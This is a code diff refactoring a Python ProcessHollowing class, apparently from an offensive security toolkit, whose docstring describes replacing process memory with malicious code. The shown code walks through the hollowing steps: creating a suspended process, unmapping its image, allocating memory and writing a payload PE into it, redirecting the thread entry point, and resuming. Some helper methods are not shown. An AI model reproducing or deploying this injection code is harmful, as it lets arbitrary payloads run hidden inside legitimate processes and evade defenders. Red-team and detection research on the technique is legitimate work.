@@ -24,7 +24,8 @@ import struct
 from typing import Any, Optional
 
 from ...utils.logger import get_logger
-from ...utils.windows_common import get_windows_kernel32, get_windows_ntdll, is_windows_available
+from ...utils.windows_common import is_windows_available
+from .base_patcher import BaseWindowsPatcher
 
 logger = get_logger(__name__)
 
@@ -40,26 +41,21 @@ else:
     AVAILABLE = False
     pefile = None
 
-class ProcessHollowing:
+class ProcessHollowing(BaseWindowsPatcher):
     """Process Hollowing - replace process memory with malicious code"""
 
     def __init__(self):
         if not AVAILABLE:
             raise RuntimeError("Process hollowing requires Windows and pefile")
-
-        self.kernel32 = get_windows_kernel32()
-        self.ntdll = get_windows_ntdll()
-        if not self.kernel32 or not self.ntdll:
-            raise RuntimeError("Failed to load required Windows libraries")
-
-        # Process creation flags
-        self.CREATE_SUSPENDED = 0x00000004
-        self.CREATE_NO_WINDOW = 0x08000000
-
-        # Memory constants
-        self.MEM_COMMIT = 0x1000
-        self.MEM_RESERVE = 0x2000
-        self.PAGE_EXECUTE_READWRITE = 0x40
+        
+        # Set flag for base class to know we need ntdll
+        self._requires_ntdll = True
+        super().__init__()
+        self.logger = get_logger(__name__)
+        
+    def get_required_libraries(self) -> list:
+        """Get list of required Windows libraries for this patcher."""
+        return ['kernel32', 'ntdll']
 
     def hollow_process(self, target_exe: str, payload_path: str) -> bool:
         """
@@ -80,18 +76,21 @@ class ProcessHollowing:
             # Parse payload PE
             payload_pe = pefile.PE(data=payload_data)
 
-            # Create suspended process
-            process_info = self._create_suspended_process(target_exe)
-            if not process_info:
-                logger.error("Failed to create suspended process")
+            from ...utils.process_common import create_suspended_process_with_context
+
+            # Create process and get context using common function
+            result = create_suspended_process_with_context(
+                self._create_suspended_process,
+                self._get_thread_context,
+                target_exe,
+                logger
+            )
+
+            success, process_info, context = self.handle_suspended_process_result(result, logger)
+            if not success:
                 return False
 
             try:
-                # Get process context
-                context = self._get_thread_context(process_info['thread_handle'])
-                if not context:
-                    logger.error("Failed to get thread context")
-                    return False
 
                 # Get image base from PEB
                 peb_addr = self._get_peb_address_from_context(context)
@@ -111,8 +110,11 @@ class ProcessHollowing:
                     logger.warning("Failed to unmap original section")
 
                 # Allocate memory for payload
-                payload_base = payload_pe.OPTIONAL_HEADER.ImageBase
-                payload_size = payload_pe.OPTIONAL_HEADER.SizeOfImage
+                payload_base = getattr(payload_pe.OPTIONAL_HEADER, 'ImageBase', 0x400000)
+                payload_size = getattr(payload_pe.OPTIONAL_HEADER, 'SizeOfImage', 0)
+                if not payload_size:
+                    logger.error("Failed to get SizeOfImage from payload PE header")
+                    return False
 
                 allocated_base = self._allocate_memory(
                     process_info['process_handle'],
@@ -165,7 +167,11 @@ class ProcessHollowing:
                         return False
 
                 # Update entry point in context
-                new_entry_point = allocated_base + payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint
+                entry_point_offset = getattr(payload_pe.OPTIONAL_HEADER, 'AddressOfEntryPoint', 0)
+                if not entry_point_offset:
+                    logger.error("Failed to get AddressOfEntryPoint from payload PE header")
+                    return False
+                new_entry_point = allocated_base + entry_point_offset
 
                 if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                     context.Rcx = new_entry_point
@@ -192,8 +198,8 @@ class ProcessHollowing:
 
             finally:
                 # Clean up handles
-                self.kernel32.CloseHandle(process_info['thread_handle'])
-                self.kernel32.CloseHandle(process_info['process_handle'])
+                from ...utils.windows_common import cleanup_process_handles
+                cleanup_process_handles(self.kernel32, process_info, logger)
 
         except Exception as e:
             logger.error(f"Process hollowing failed: {e}")
